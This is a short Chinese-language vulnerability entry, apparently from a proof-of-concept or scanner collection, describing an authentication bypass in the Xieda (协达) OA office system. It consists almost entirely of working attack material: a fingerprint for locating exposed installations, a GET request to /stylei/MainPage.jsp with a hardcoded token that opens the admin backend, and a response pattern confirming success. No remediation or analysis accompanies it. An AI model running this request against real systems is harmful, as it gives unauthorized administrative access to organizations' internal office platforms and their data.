# 协达OA系统绕过登录认证登陆后台漏洞

协达OA系统绕过登录认证登陆后台 ｜ 其他 ｜ —
- **指纹**：`body="/interface/CheckLoginName.jsp"`
- **请求**：`GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1`
- **响应特征**：200 ^(?!.*?登录信息已失效).*?$